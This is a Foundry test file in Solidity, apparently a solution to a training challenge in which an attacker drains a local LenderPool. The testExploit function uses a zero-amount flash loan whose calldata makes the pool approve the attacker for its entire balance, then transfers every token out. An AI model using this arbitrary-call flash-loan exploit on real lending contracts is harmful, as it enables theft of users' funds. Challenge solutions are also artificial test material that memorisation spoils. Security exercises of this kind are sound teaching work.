// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;


import {Test, console} from "forge-std/Test.sol";
import "../../src/week7_lender/AmazingToken.sol";
import "../../src/week7_lender/LenderPool.sol";

contract LenderPoolBaseTest is Test {

    // Pool has 1000000 token in balance
    uint TOKENS_IN_POOL = 1000000;

    AmazingToken token;
    LenderPool pool;

    address attacker = makeAddr("attacker");

    function setUp() public  {
        // setup contracts
        token = new AmazingToken();
        pool = new LenderPool(address(token));


        token.transfer(address(pool), TOKENS_IN_POOL);

        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(token.balanceOf(attacker), 0);
    }
     function testExploit() public {
        /** CODE YOUR EXPLOIT HERE */

        // Act as the attacker
        vm.prank(attacker);
        // make the pool approve the attacker to manage the whole pool balance while taking a free loan
        bytes memory attackCallData = abi.encodeWithSignature("approve(address,uint256)", attacker, TOKENS_IN_POOL);
        pool.flashLoan(0, attacker, address(token), attackCallData);

        // now steal all the funds
        vm.prank(attacker);
        token.transferFrom(address(pool), attacker, TOKENS_IN_POOL);
         /** SUCCESS CONDITIONS */
        // Attacker has taken all tokens from the pool
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }

    modifier checkChallengeSolved() {
        _;
        assertEq(token.balanceOf(attacker), TOKENS_IN_POOL);
        assertEq(token.balanceOf(address(pool)), 0);
    }
}